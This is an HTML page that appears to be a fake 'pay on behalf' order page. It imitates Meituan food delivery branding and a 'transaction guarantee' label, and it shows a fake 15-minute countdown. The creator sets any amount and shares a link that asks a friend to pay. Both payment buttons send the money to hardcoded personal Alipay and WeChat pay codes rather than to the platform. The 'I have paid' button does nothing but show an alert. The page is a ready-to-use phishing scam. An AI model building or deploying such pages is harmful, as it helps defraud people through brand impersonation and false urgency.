<!doctype html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>代付订单</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
        .card { background: #fff; border-radius: 12px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); text-align: center; }
        .timer-box { background: #fffde7; border: 1px solid #ffe082; padding: 15px; border-radius: 8px; margin: 15px 0; }
        .btn { width: 100%; padding: 16px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
        .btn-primary { background: #ffd000; color: #333; }
        .btn-secondary { background: #f0f0f0; color: #666; }
        .menu-list { text-align: left; margin: 20px 0; border-top: 1px solid #eee; padding-top: 10px; }
    </style>
</head>
<body>

<div id="order-view">
    <div class="card">
        <h3>🍴 请选择菜品</h3>
        <button class="btn btn-secondary" onclick="setData(19.8, '牛肉丸汤')">牛肉丸汤 ¥19.8</button>
        <button class="btn btn-secondary" onclick="setData(88.0, '超级大餐')">超级大餐 ¥88.0</button>
        <input type="number" id="custom-amount" placeholder="输入金额" style="width:100%; padding:15px; margin:10px 0; border:1px solid #ddd; border-radius:8px;">
        <button class="btn btn-primary" onclick="shareOrder()">🎁 一键分享给好友</button>
    </div>
</div>

<div id="pay-view" style="display:none;">
    <div class="card">
        <div style="font-weight:bold; margin-bottom:10px;">美团外卖 | 交易保障</div>
        <div style="font-size: 18px; margin-bottom: 10px;">Hi, 你和我的距离只差一顿外卖~</div>
        
        <div style="background:#ffeb3b; padding:20px; border-radius:12px;">
            <div style="font-size: 20px; font-weight: bold;">来帮我代付吧 ~</div>
            <div class="timer-box">
                剩余支付时间 <br> <span id="countdown" style="font-size: 24px; font-weight: bold;">14:59</span>
            </div>
        </div>

        <div class="menu-list">
            <p>需付款: <strong style="font-size: 24px;">¥<span id="display-amount">0.00</span></strong></p>
            <p>项目: <span id="display-name"></span></p>
        </div>

        <button class="btn btn-primary" onclick="wakeUpAlipay()">为好友买单 (支付宝)</button>
        <button class="btn btn-primary" style="background:#07c160; color:#fff;" onclick="wakeUpWechat()">为好友买单 (微信)</button>
        <button class="btn btn-secondary" onclick="alert('请通过支付界面确认')">我已支付，点击确认</button>
    </div>
</div>

<script>
    const ALIPAY_QR_URL = "https://qr.alipay.com/2m612342txzv1x1aorosqa0";
    const WECHAT_URL = "wxp://f2f07AWx-sG678z4zmpyiIjVJgl0raLlDk-BHza47alK-bI";
    let selectedName = "";

    function setData(p, name) { document.getElementById('custom-amount').value = p; selectedName = name; }

    function startTimer(duration) {
        let timer = duration;
        setInterval(() => {
            let m = parseInt(timer / 60, 10);
            let s = parseInt(timer % 60, 10);
            document.getElementById('countdown').textContent = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
            if (--timer < 0) timer = 0;
        }, 1000);
    }

    const params = new URLSearchParams(window.location.search);
    if (params.get('amount')) {
        document.getElementById('order-view').style.display = 'none';
        document.getElementById('pay-view').style.display = 'block';
        document.getElementById('display-amount').innerText = params.get('amount');
        document.getElementById('display-name').innerText = decodeURIComponent(params.get('name') || "外卖订单");
        startTimer(899); // 15分钟倒计时
    }

    async function shareOrder() {
        const val = document.getElementById('custom-amount').value;
        if(!val) return alert("请选择金额");
        const url = window.location.origin + window.location.pathname + "?amount=" + val + "&name=" + encodeURIComponent(selectedName);
        if (navigator.share) await navigator.share({title: '帮我代付', url: url});
        else { navigator.clipboard.writeText(url); alert("链接已复制"); }
    }

    function wakeUpAlipay() {
        window.location.href = `alipays://platformapi/startapp?saId=10000007&qrcode=${encodeURIComponent(ALIPAY_QR_URL)}`;
    }
    
    function wakeUpWechat() {
        window.location.href = WECHAT_URL;
    }
</script>
</body>
</html>
